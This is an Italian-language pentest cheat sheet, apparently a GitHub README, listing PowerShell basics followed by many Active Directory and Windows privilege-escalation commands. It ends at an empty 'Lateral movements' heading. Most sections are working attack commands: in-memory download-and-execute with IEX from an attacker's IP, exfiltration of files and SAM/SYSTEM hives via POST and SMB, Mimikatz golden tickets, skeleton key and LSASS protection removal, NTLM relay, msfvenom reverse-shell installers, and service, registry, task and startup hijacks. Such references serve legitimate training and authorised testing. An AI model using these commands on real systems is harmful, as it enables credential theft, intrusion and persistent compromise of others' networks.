# Lista Link  
_Lista di comandi powershell generali, che vanno dalla info alla gestione dei file:_

 [Comandi Powershell:](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#comandi-powershell)
<!-- spazio -->
   - [Comandi Powershell info generali PC](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#comandi-powershell-info-generali-pc)
 <!-- spazio -->
   - [Comandi per i file](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#comandi-per-i-file)
       - [Download/Upload file](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#downloadupload-file)
 <!-- spazio -->
   - [Comandi ADS (Alternate Data Stream)](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet#comandi-ads-alternate-data-stream)
  
_Lista che viene aggiornata man mano con metodologie, tool, comandi e CVE inerenti al mondo dell Active Directory:_

 [Active Directory Pentest:](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#active-directory-pentest)
<!-- spazio -->
   - [Tools:](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/edit/main/README.md#tools)
       - [Powerview](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#Powerview)
       - [Bloodhund settings](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#bloodhund-settings)
       - [Mimikatz](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#mimikatz)
       - [Suite impacket e  utilizzi](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#suite-impacket-e-vari-utilizzi)
<!-- spazio -->
   - [Privilege Escalation:](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet#privilege-escalation)
       - [Servizi](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#servizi__)
       - [Registri](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#registri__)
       - [Credenziali](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#credenziali)
       - [Misconfiguration di vario tipo](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#misconfiguration-di-vario-tipo)
       - [tools](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#tools-1)
<!-- spazio --> 
   - [Lateral movements:](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#lateral-movements)
       - [Lanciare comandi da remoto](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#lanciare-comandi-da-remoto)
       - [Port Forwarding](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#port-forwarding)
<!-- spazio -->
   - [DACL attacks:](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet#dacl-attacks)
        - [WriteDACL](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet#dacl-attacks)
<!-- spazio -->
   - [Bypass:](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet#bypass)
        - [Bypass UAC](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#bypass-uac)
        - [Bypass AMSI](https://github.com/AleHelp/Windows-Powershell-and-Pentesting-cheatsheet/blob/main/README.md#bypass-amsi)
<!-- spazio -->
   - [CVE Active Directory:](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#cve-active-directory)
        - [CVE-2022-26923](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#cve-2022-26923-vulnerabilit%C3%A0-sui-certificati-dellad)
<!-- spazio -->
   - [Note pentest](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#note-pentest)
<!-- spazio -->
_Nozioni e note di diverso tipo inerenti a windows:_

 [Windows:](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#windows)
<!-- spazio -->
   - [Processi di avvio](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/tree/main#processi-di-avvio)
<!-- spazio -->
   - [Register keys](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#register-keys)
<!-- spazio -->
   - [API](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet#api)
<!-- spazio -->
   - [UAC](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#uac)
<!-- spazio -->
   - [AMSI](https://github.com/AleHelp/Powershell-and-Pentesting-cheatsheet/blob/main/README.md#amsi)
<!-- spazio -->
   - [Note sulla sicurezza in Windows](https://github.com/AleHelp/Powershell-and-CMD-cheatsheet/blob/main/README.md#note-sulla-sicurezza-in-windows)
<!-- spazio -->
# Comandi Powershell:
<!-- -->
    fl #per ricevere più output 
<!-- -->
ES: 
_Get-Acl | fl_
<!-- -->
    Get-Help <nome comando > -Full #ottieni l'help dei comandi
 <!-- spazio -->
    Update-Help -Force #per aggiornare gli help alla versione più recente    
 <!-- spazio -->
    Select-Object #utilizzato per prendere un campo dell'oggetto specifico 
ES:
_Get-LocalUser John | Select-Object LastLogon_
<!-- -->
    Get-Command #utilizzato per sapere se un comando o un eseguibile è presente in powershell
<!-- spazio -->
    New-LocalUser  #per creare nuovi utenti locali
<!---->
ES:
_New-LocalUser -Name User -Password (ConvertTo-SecureString -AsPlainText "123456789" -Force)_
<!-- -->
    New-LocalGroup #per creare un nuovo gruppo
<!-- -->
ES:
_New-LocalGroup -Name $Group_
<!-- -->
    Add-LocalGroupMember #aggiungi un utente ad un gruppo
<!-- -->
ES:
_Add-LocalGroupMember -Group $Group -Member $User_
<!---->
    reg query #per interrogare i registri
<!-- spazio -->
    New-item #per creare file, cartelle o modificare valori
 <!-- spazio -->
    Set-item #per modificare file, cartelle o modificare valori
<!-- spazio -->
    Start-service <nome servizio> #comando per avviare un servizio     
ES:
_Start-service WinRM_
<!-- spazio -->
 ### Comandi Powershell info generali PC  

    Get-ComputerInfo #prendi informazioni della macchina
<!-- spazio -->
    Get-Localuser #listi gli utenti nella macchina
<!-- spazio -->
    Get-ScheduledTask #listi tutti gli schedule task /tasklist
<!-- spazio -->
    Get-Acl #per listare le access-list dei permessi
<!-- spazio -->
    Get-PSDrive  #lista i drive dell'ambiente legati a powershell che possono essere variabili,oggetti,registri e volumi.
<!-- spazio -->  
    Get-ADDomain #per prendere tutte le informazione dell'AD Domain
<!-- spazio -->  
     Get-NetIPAddress #comando powershell per ottenere configurazione di rete
<!-- spazio -->     


### Comandi per i File
<!-- spazio -->
      Get-Content -path "<file>" # comando per leggere il contenuto
ES:
<!-- spazio -->
_(Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte)_
<!-- spazio -->
      [IO.File]::WriteAllBytes(<file path>, <dati da scrivere>) #dalla classe IO.FILE richiama WriteAllBytes che scrive i Bytes
<!-- spazio -->

##### Download/Upload File
__Download:__
<!-- spazio -->
      curl -o reverse.exe http://<ip source>/<file da scaricare>
<!-- spazio -->
      (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File>') #semplice download
 <!--spazio -->
      (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')#download async cioè senza bloccare il calling thread
 <!--spazio -->
      [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} #Bypassing controllo certificato 
 <!--spazio -->
_possiamo trasferire un file senza dovre scaricare uno script ma runnarlo direttamente in memoria:_ 
 <!-- spazio -->
      IEX (New-Object Net.WebClient).DownloadString(<target File URL>, <Output File>) # tramite IEX(Invoke-Expression) runniamo direttamentei in memoria
 <!-- spazio -->
 __Upload__
  <!-- spazio -->
 __N.B importante e avviare un server upload che riceva i file.__
  <!-- spazio -->
 _Comandi per avviare un server upload python e comandi powershell per inviare:_
 <!-- spazio -->
      pip3 install uploadserver #modulo che permette l'avvio di un uploadserver
<!-- spazio -->
      python3 -m uploadserver #comando per avviarlo e funzionerà sulla porta 8000
<!-- spazio -->
 _Ci sono 2 metodologie di download che cambiano in base ai permessi che abbiamo:_ 
 <!-- spazio -->
 - 1 caricando uno script per l'upload in RAM tramite IEX:
   <!---->
   _sulla macchina locale scaricare lo script:_
 <!---->
     wget https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1 #scarichiamo lo script che ci permette l'upload
     python3 -m http.server 80 #apriamo un server che ci permetterà di erogare il file
 <!-- spazio -->
   _sulla macchina remota carichiamo lo script in ram tramite IEX_
   <!---->
         IEX(New-Object Net.WebClient).DownloadString('http://<nostro_ip_locale>:<nostra_porta>/PSUpload.ps1') #carica in memoria ed esegue il nostro script
 <!-- spazio -->
         Invoke-FileUpload -Uri <URL dove fare upload del file -destination> -File <Path file di cosa caricare -source>  #comando dello script per fare upload
 <!-- spazio -->
 - 2 importare il .ps1 che permette l'upload direttamente sul disco in modo permanente
      runnare lo script:
 <!-- spazio -->
         . .\PSUpload.ps1 #comando per avviare lo script
<!-- spazio -->
         Invoke-FileUpload -Uri <URL da dove fare upload> -File <Path file di cosa uplodare> #comando dello script per fare upload
 <!-- spazio -->
_Upload tramite encoding in base64:_ 
<!-- spazio -->
      b64 = [System.convert]::ToBase64String((Get-Content -Path '<file target>' -Encoding Byte))
      #variabile che stora il base64 del file
<!-- spazio -->      
      Invoke-WebRequest -Uri <ip server> -Method POST -Body $b64 #inviamo il base64 del file tramite richiesta POST
<!-- spazio -->
_SMB_
_Comando per avviare il server SMB per l'upload e download:_ 
 <!-- spazio -->
      impacket-smbserver <nome share online> <path directory locale che condividi>
<!-- spazio -->
      impacket-smbserver <nome share online> -smb2support <path directory locale che condividi> #comando per avviarlo con smbV2
<!-- spazio -->
      copy <path del file da uplodare>  \\<ip della destinazione dove mandare>\<nome share a cui accedere> 
      #comando per fare upload, facendo una copia sul server SMB upload
<!-- spazio -->
      copy \\ip sorgente da cui scaricare\<nome share>\<file da scaricare> <Path locale di dove salvarlo>
<!-- spazio -->
      net use n: \\<ip target>\share /user:test test #fare il mount da di un SMB su una windows machine
<!-- spazio -->
    
### comandi ADS (alternate data stream)
<!-- -->
_Utili per gestire risorse ADS_

      Get-Item -path <path> -stream * #ottiene tutti gli ADS (alternate datastream di un file)
<!-- -->
      set-content -path <path del file> -stream <nome del nuovo stream> #crea un nuovo ADS e apre un terminale in cui è possibile scrivere il nuovo ADS
<!-- -->
      gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$Data' #cerca in tutto il filesystem la presenza  di ADS
<!-- -->
      remove-item –path <path al file> –stream <nome stream da rimuovere> #rimuove lo stream su un determinato file
<!-- -->

# Active Directory Pentest:

_comandi SMB:_
<!-- spazio -->

    smbmap -H <ip> -L #comando per listare e indica i permessi
<!-- spazio -->

    smbclient -L \\\\\<ip>\\ #comando per listare
<!-- spazio -->

    smbclient  \\\\<ip>\\<shares> -U <user> #comando per entrare nello share e poi inserire la password
<!-- spazio -->

_enumerazione del DC:_
Comando per enumerare il DC, ci da l'output di: nome dominio, gruppi, utenti e SMB e altro:
<!-- spazio -->

    enum4linux <ip> #enumerazione
    
_enumerazione utenti:_
<!-- spazio -->

-crackmapexec, però se abbiamo l'accesso a IPC$ all'interno di SMB:
<!-- spazio -->

    crackmapexec smb VULNNET-RST -u 'guest' -p '' --rid-brute
<!-- spazio -->

-kerbrute, tramite una lista di user possiamo vederee che Users ci sono:
<!-- spazio -->

    kerbrute_linux_amd64 userenum -d <domain_name> --dc <domain_controller_ip> <wordlist>
<!-- spazio -->

_recupero TGT utenti:_
<!-- spazio -->

    impacket-GetNPUsers <dominio>/<utente> -no-pass #funziona solamente con utenti che non hanno settata la flag UF_DONT_REQUIRE_PREAUTH
<!-- spazio -->

_recupero credenziali:_
<!-- spazio -->
    impacket-secretsdump -dc-ip <ip della macchina> <utente>:<password>@<ip macchina> #recupera NTDS.DIt, SAM hashes
<!-- spazio -->
_connessione remota alla target machine e comandi utili:_
<!---->
    winexe -U '<username>%<password>' //<ip_bersaglio> cmd.exe  #esegue processi (in questo caso cmd) da remoto sfruttando SMB
<!-- spazio -->
    evil-winrm -i <nome dominio> -u <nome utente> -H <hash NTLM> o -p <password> #utilizziamo il WinRM protocol per connettersi
<!-- spazio -->
    upload <path file da dove caricare> <nome di come salvarlo> #comando per uplodare dalla kali alla target machine il file
<!-- spazio -->
    download <path file dove scaricare> <path file dove salvare> #comando per il download del file dalla target machine alla kali
<!-- spazio -->
    rdesktop -u <nome utente> -p <password> <ip> #comando per connettersi con RDP
_utilizzo di responder che tramite LLMNR(Link-Local Multicast Name Resolution poisoning) recupera le credenziali in chiaro._
<!-- spazio -->
    sudo responder -I <interfaccia di rete>
<!-- spazio -->
_attacchi MITM._
<!-- spazio -->
     sudo python3 mitm6.py -i <interfaccia di rete> -d <nome dominio target> #tool utilizzato per il man in the middle su ipv6
<!-- spazio -->

### Tools:

##### Powerview

_Scaricare PowerView.ps1 sulla macchina e avviarlo:_
<!-- spazio -->
    Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
    powershell -ep bypass
    . .\PowerView.ps1
<!-- spazio -->

_dopo aver avviato powerview abbiamo a disposizione dei comandi aggiuntivi per la rete di dominio:
enumerare gli utenti a dominio:_

    Get-NetUser #ottiene le informazioni sugli utenti

<!-- spazio -->

    Get-NetUser | select cn #per ottenere solo il common name

<!-- spazio -->

    Get-NetGroup    #ottiene tutti i gruppi presenti a dominio

<!-- spazio -->

    Get-NetGroup -GroupName *admin*    #ottiene tutti i gruppi in cui è presente la parola admin

<!-- spazio -->

    Invoke-ShareFinder    #ottiene tutte le shares smb del dominio

<!-- spazio -->

    Get-NetComputer -FullData    #ottiene tutte le informazioni su tutti i pc della rete

<!-- spazio -->

    Get-NetComputer -FullData | Select-Object logoncount    #per ridurre l'output da parsare selezioniamo l'oggeto specifico come in questo caso per gli accessi    

<!-- spazio -->

      Add-DomainObjectAcl -targetidentity "DC=<subdomain>, DC=<top_level_domain>" -principalidentity <nome_utente> -Rights DCSync -verbose #comando per aggiungere un oggetto alle       ACL
<!-- -->

_Sopra vengono riportati i comandi utilizzati più di frequente, per una visione più completa dei comandi andare [qui](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)._

##### Bloodhund settings

__Bloodhound è un tool che permette l'organizazione delle informazioni ottenute dalla fase di recognition del'AD e domini Windows__

__Abbiamo bisogno di due tools: bloodhound e neo4j (che farà da database per bloodhound)__

      sudo apt install neo4j && sudo apt install bloodhound
<!-- -->

      neo4j console #apriamo la console di neo4j per startare il db
<!-- -->
_Dobbiamo navigare sull'interfaccia web di neo4j per loggare e cambiare la password di default.
Cerchiamo perciò http://localhost:7474/ e logghiamo con le credenziali di default (neo4j:neo4j)
e inseriamo la nostra nuova password._
<!-- -->
_Avviamo adesso bloodhound:_

      bloodhound

<!-- -->
_sulla macchina vittima (windows a dominio) su cui abbiamo RCE eseguiamo questo comando
(lo script powershell deve essere ovviamente già sulla macchina)_

      . .\SharpHound.ps1
      Invoke-BloodHound -CollectionMethod All -OutputDirectory "<Path della cartella dove salvare lo zip>"
<!-- -->
_adesso scarichiamo il file sulla nostra macchina;
una volta fatto questo andiamo sull'interfaccia grafica di bloodhound e importiamo il file strisciandocelo sopra oppure selezionando l'icona importa mappa._

##### Mimikatz:
_Mimikatz è utilizzato per recuperare hash, password, recupero e creazione di ticket kerberos._

__Consigliamo di utilizzare mimikatz integrato con meterpreter per una maggiore praticità.__

Commandi:
<!-- -->
      privilege::debug #comando per assicurarsi di runnare mimikatz come amministratore
<!-- -->
      lsadump::lsa /patch #comando per recupere NTLm hash
<!-- -->
      kerberos::golden /user: /domain: /sid:<sid utente> /krbtgt:<NTLM utente> /id:<id utente> #comando per creare un golden ticket
<!-- -->
_Golden ticket si ha accesso a tutti i servizi del kerberos._
<!-- -->
      kerberos::golden /user: /domain: /sid:<sid servizio> /krbtgt:<NTLM servizio> /id:<id servizio> #comando per creare un silver ticket
<!-- -->
_Silver ticket si ha accesso ad un servizio del kerberos è più silensiozo del golden._
<!-- -->
      misc::cmd #apre un cmd nuovo
<!-- -->
      sekurlsa::tickets /export #comando per esportare i .kirbi tickets e li recupera da LSASS memoria
<!-- -->
      kerberos::ptt <ticket> #comando per fare il pass the ticket
<!-- -->    
      !+
      !processprotect /process:lsass.exe /remove
      misc::skeleton
      !- #comandi per creare una skeleton key
<!-- -->    
      
##### Suite impacket e utilizzi:
_in questa sezione vengono spiegati cosa e come funzionano i vari tool della suite Impacket._
<!-- -->
      impacket-GetUserSPNs #sfrutta la vulnerabilita di kerberoasting per ottenere gli SPN(Service Principal Name) dei vari servizi
ES:_impacket-GetUserSPNs <nome_dominio> backslash <user> duepunti <password> -dc-ip <ip_domain_controller> -request_
<!-- -->
      impacket-GetNPUsers  #sfrutta la misconfigurazione di utenti che non hanno settata la flag UF_DONT_REQUIRE_PREAUTH del kerberos cioè autenticarsi senza richiedere la password
<!-- -->
ES:_impacket-GetNPUsers <nome_dominio>backslash<nome_account> -no-pass_
<!-- -->
      impacket-secretsdump #recupera NTDS.DIt, SAM hashes locali
<!-- -->
ES:_impacket-secretsdump -dc-ip <ip_del_domain_controller> <nome_account>:<passoword>@<ip_domain_controller>_ 
<!-- -->     
      impacket-ntlmrelayx #ruba le credenziali NTLM quando vengono inviate tra utenti
<!-- -->
ES:_impacket-ntlmrelayx -6 -t ldaps://<ip_target> -wh wpad.<dominio> -l <directory_dove_salvare>_ 
<!-- -->
      impacket-addcomputer #comando per aggiungere un computer a dominio
_aggiungere la macchina remota compromessa alla propria rete locale (con ldaps) di macchine con impacket per exploit successivi_
<!-- spazio -->
      impacket-addcomputer '<dominio>/<username>:<password>' -method LDAPS -computer-name '<nome_da_scegliere>' -computer-pass '<password_da_scegliere>'
<!-- spazio -->
ES:_impacket-addcomputer -dc-ip <domain_controller_ip> -computer-name <nome_computer> -computer-pass '<password>' '<nome_tdl_dominio><!-- -->:<!-- --><username>:<password>'_
<!-- -->
      impacket-smbserver #comando per startar un smb server
<!-- -->
ES:_impacket-smbserver <Nome_share_da_inserire_nel_comando_di_upload> -smb2support <share_locale_che_condividi>_
<!-- -->
_generare certificati come utente (semplice) autenticato per testare l'exploit CVE-2022-26923_
<!-- -->
      sudo certipy-ad req -u '<username/nome_pc>@<dominio>' -p '<password>' -dc-ip <ip_del_domain_controller> -template <tipo_di_ceritficato> -ca          
      <dominio_certificate_autority>
<!-- -->
# Privilege Escalation:
<!---->
 _alcuni metodi per scalare i propri privilegi in windows e controllare permessi che potrebbero essere vettore di scalata_
 <!---->

 ### Servizi:
 
 - __Abusare permessi insicuri nei servizi:__

 _Per controllare le misconfiguration utilizzeremo accesschk.exe (utility che serve a controllare i permessi ACL su oggetti di sistma Windows) è contenuto nella 
 suite di sysmon scaricabile dal seguente [link](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk):_
 <!---->
    accesschk.exe /accepteula -uwcqv <nome_utente> <nome_servizio> #restituisce i permessi dell'utente relativi al servizio ricercato
 <!---->
 _se l'utente ha il seguente privilegio __"SERVICE_CHANGE_CONFIG"__ può essere vettore di scalata:_
 <!---->
 _facciamo una query al servizio per controllare che giri come SYSTEM (o LocalSystem) sotto la voce __"SERVICE_START_NAME"___
 <!---->
    sc qc <nome_servizio> #fa una query al servizio per ottenere i suoi dettagli
 <!---->
 _a questo punto possiamo sostituire il binario puntato dal servizio con uno creato da noi per farlo eseguire al riavvio:_
 <!---->
    sc config <nome_servizio> binpath= "\"<path_al_nostro_eseguibile>\"" #indichiamo la path con gli apici attraverso l'escape char
 <!---->
    net start <service> #avviando il servizio verrà lanciato il nostro eseguibile come amministratore
 <!---->
 
- __abusare di path non racchiuse da doppi apici:__
 <!---->
_se la path di un servizio è scritta nel seguente modo: 
<!---->
    BINARY_PATH_NAME: <Path_al_servizio>\<directory>\.. #non racchiusa dalle virgolette 

_può essere vettore di scalata di priviliegi perchè senza doppie virgolette la path viene letta male dal sistema e con gli spazi che vengono letti come dei break windows proverà ad eseguire un qualcosa prima di ogni spazio_

ES:
C:\Windows\Tasks\rev.exe

C:\rev.exe

C:\Windows\rev.ese

C:\windows\Tasks\rev.exe

_possiamo di conseguenza inserire un eseguibile (sempre se ho i permessi di write sui servizi e sulla directory da modificare)._
<!---->
    copy <Path_del_nostro_eseguibile> "<path_del_servizio>\Common.exe" #così facendo il sistema cercerà la path e arrivato allo spazio eseguirà il nostro comando     prendendo i dati successivi come argomenti dell'eseguibile
<!---->
    net start <service_name>
<!---->
- __Abusare di eccessivi permessi di modifica delle chiavi di registro:__
<!---->
    sc qc <nome_servizio> #fa una query al servizio
<!---->
    accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<nome_servizio> #controlla i permessi e chi ha accesso alle chiavi di un servizio di      resgistro
<!---->
___"NT AUTHORITY\INTERACTIVE"__ se le chiavi sono accessibili da questo gruppo significa che tutti gli utenti con logon possono modificarle:_
<!---->
    reg add HKLM\SYSTEM\CurrentControlSet\services\<nome_servizio> /v ImagePath /t REG_EXPAND_SZ /d <path_nostro_eseguibile> /f
<!---->
    net start <nome_servizio>
<!---->
- __Abusare permessi di scrittura sugli eseguibili dei servizi:__
<!---->
    sc qc <nome_servizio> #fa una query al servizio
<!---->
    C:\PrivEsc\accesschk.exe /accepteula -quvw "<Path servizio>"
<!---->
 _Notiamo che il __"BINARY PATH NAME"__ è scrivibile da tutti_
<!---->
    copy <nostro_eseguibile> <path_del_binario_del_servizio> #se abbiamo permessi di scrittura sull'eseguibile del servizio possiamo sostituirlo con il nostro 
<!---->

### Registri:

- __Abusare degli autorun attraverso le chiavi di registro:__
<!---->
    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run #interroga i registri per cercare eseguibili con autorun
<!---->
    accesschk.exe /accepteula -wvu "<path_dell_eseguibile>" #ricerca le proprietà degli eseguibili che sono autorun
<!---->
_se l'eseguibile è word-writable possiamo sostituirlo con il nostro e riavviare la macchina:_
<!---->
    copy <nostro_eseguibile_da_runnare> "<path_dell_autorun>" /Y  #dopo il riavvio si attiverà automaticamente
<!---->
- __Abusare dei privilegi di installazione come amministratore (permettono di installare sempre un programma come amministratore)__
  
  _Andremo a controllare tramite la reg query se AlwaysInstallElevated è settato a 1 o 0, AlwaysInstallElevated controlla la richiesta di elevazione dei privilegi del MSI installer, se settato a 0 l'installer richiede di elevare i privilegi solo quando serve invece se ad 1 l'installer lo richiede sempre cosi facendo può causare una scalata dei privilegi._
  
<!---->
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  #interroga le chiavi di registro
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  #se sono settate su 0x1 sono attive
<!---->
_possiamo creare un installer con msfvenom per richiamare una revshell da amministratore quando installato:_
<!---->
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip_attaccante> LPORT=<porta_attaccante> -f msi -o installer.msi
<!---->

### Credenziali:

_Questa sezione fa riferimento a luoghi generali o errori di dove possano esservi delle credenziali_

- __Dumping di password da registri o nel credmanager:__
<!---->
     reg query HKLM /f password /t REG_SZ /s #ricerca dei registri che contengono la parola password
<!---->
     reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon" #comando per la ricerca di password del logon
<!---->  
     cmdkey /list #comando per cercare password nel credmanager
<!---->  
- __Dumping del SAM o SYSTEM:__

_Se abbiamo la fortunata di trovare in giro un backup del SAM o del SYSTEM o ancora meglio, avere privilegi come SeBackup/SeRestore (permettono di leggere e scrivere ogni file del fileysystem bypassandro le ACL) possiamo salvarceli e dumpare le credenziali_

    reg save hklm\system C:\Users\THMBackup\system.hive
    reg save hklm\sam C:\Users\THMBackup\sam.hive

<!---->  
    copy C:\Windows\Repair\Systen.hive \\<ip destinazione>\<nome share>\ 
    copy C:\Windows\Repair\sam.hive \\<ip destinazione>\<nome share>\ #comandi per passarsi i backup tramite SMB
<!---->  
    git clone https://github.com/Tib3rius/creddump7 #comando per installare le repo di creddump7
    pip3 install pycrypto #comando per installarlo
    python3 creddump7/pwdump.py SYSTEM SAM #comando per recuperare le password
<!---->  

- __Credenziali di WDS:__
  
_Quando si vuole installare una stessa immagine di windows ma su più macchine nella rete, è possibile utilizzare Windows Deployment Services, il quale installa la stessa image su diversi computer attraverso la rete e lo fa in maniera autonoma, puà capitare che all'interno di determinati file possano esserce ancora delle credenziali_

_cartelle:_
<!---->  
    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml
<!---->  
- __History powershell e cmd:__

_windows in un file tiene traccia dei comandi powershell o cmd che uno scrive e possiamo recuperarli con questi comandi:_
<!---->  
    %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt #comando per aprire la history in cmd
<!---->  
    C:\Users\<nome utente>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt #comando per aprire la history in powershell
<!---->  

- __Configurazione IIS:__

_IIS(Internet Information Service) è il web server di default in windows, dove è possibile che vi siano delle credenziali nel file __"web.config"___

_cartelle dove poter vedere:_ 
<!---->  
    C:\inetpub\wwwroot\web.config
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
<!---->  
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString #comando per cercare credenziali
<!----> 
- __Putty proxy configurations:__

_Putty è un SSH client che troviamo spesso nelle windows machine, è possibile recuperare le sue proxy configuration, dove tiene le credenziali in chiaro_

_comando:_
<!---->  
    reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
<!---->  
### Misconfiguration di vario tipo:

- __Utilizzo di GUI:__

_Quando possibile se si ha accesso ad una windows machine cioè tramite RDP ed quindi possibile utilizzare la GUI e vi possono essere degli eseguibili che runnano in modalità privilegiatà puù essere utile un commando._
<!---->
     tasklist /V | findstr <nome eseguibile> #comando che lista tutti i processi in verbose mode che poi manda a findstr per cercare il determinato processo
<!---->

- __StartUp directory:__
<!---->
     C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" #comando per vedere se abbiamo i permessi di writing sulla cartella StartUp
<!---->
     Set oWS = WScript.CreateObject("WScript.Shell")
     sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
     Set oLink = oWS.CreateShortcut(sLinkFile)
     oLink.TargetPath = "C:\<word writable folder>\<nome eseguibile da usare>.exe"
     oLink.Save #questo script in vbs permette di creare un collegamento nella directory startup che punterè ad un nostro eseguibile
<!---->
- __Potato attacks:__

_Rogue potato:_
Spiegazione: 

_Con i privilegi SeAssignPrimaryToken o SeImpersonate privilege un utente può runnare codice o creare nuovi processi in account di altri utenti. con l'exploit da un local o network service diventiamo System_

Commandi:
<!---->
     sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.3.158:9999 #bindiamo la porta della nostra macchina 135 alla 9999 di windows
<!---->
     nc -lnvp <porta> #comando per aprire un listener
<!---->
     C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\<path revshell> #entriamo con l'utente che ha i privilegi sopra citati e con PSexec64 apriamo una revshell
     con l'utente "nt authority\local service" alla nostra machine
<!---->
      nc -lnvp <porta> #riaspriamo un listener per la seconda revshell che verrà utilizzata per l'utente SYSTEM
<!---->
     C:\<path>\RoguePotato.exe -r <ip> -e "<path eseguibile>" -l 9999 #comando da utilizzare nella prima revshell che tramite l'eseguibile RoguePotato otterremo il SYSTEM
<!---->

- __Scheduled Tasks:__

_Vettori di priviliege escalation possono essere task creati da utenti ma mal configurati_

_Comandi:_
<!---->
    schtasks /query /tn <nome task> /fo list /v #comando per ottenere info su un task
<!---->
    Task to Run: #parametro che indica cosa runna il task 
<!---->
    Run as User: #parametro che indica che user lo runna
<!---->
     icacls <Path eseguibile nel parametro Task to run> #andiamo a vedere i permessi che abbiamo sull'eseguibile
<!---->
     echo c:\<path nostro eseguibile> -e cmd.exe <ip> <porta> > <path da sostituire del parametro Task to run> #comando che in questo caso inserisce una revshell
<!---->
     schtasks /run /tn vulntask #comando per avviare il task
<!---->

- __Privilegio SeTakeOwnerShip:__

_Questo privilegio permette di prendere il controllo di ogni oggetto del sistema, incluso file,chiavi di registro o servizi è molto probabile che possa essere utilizzato per prendere di mira oggetti che runnano come SYSTEM_

_Comandi:_ 
<!---->
    whoami /priv #comando per vedere i propri privilegi
<!---->
    takeown /f C:<path eseguibile> #comando che permette di prenderne il controllo
<!---->   
    icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F 
    #Avendo il controllo non per forza abbiamo i permessi necessari, ma comuqnue con il SeTakeOwnerShip possiamo darceli con il seguente comando
<!---->  
    copy cmd.exe <nome eseguibile> #comando per sostituire l'eseguibile 
<!---->  

- __Unpatched Software:__

_Nella macchina target, possono esserci benissimo software non aggiornati all'ultima versione che possono essere vettori di priviliege escalation_

_Comandi:_

    wmic product get name,version,vendor #comando per listare software e info, non funziona sempre per tutti i programmi

### tools:

 - [winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) = tool molto potente per cercare possibili privesc

 - [PrivescCheck](https://github.com/itm4n/PrivescCheck) = alternativa a WINpeas se non si vuole eseguire un file binario

 - [Wesng](https://github.com/bitsadmin/wesng) = python script meno rumoroso rispetto a winpeas

 _N.B prima di startare wesng utilizzare il comando __"wes.py --update"__ per aggiornare il db, poi runnare il comando __"systeminfo"__ ed infine per avviare lo script utilizzare il        seguente comando __"wes.py systeminfo.txt"___

### Lateral movements:

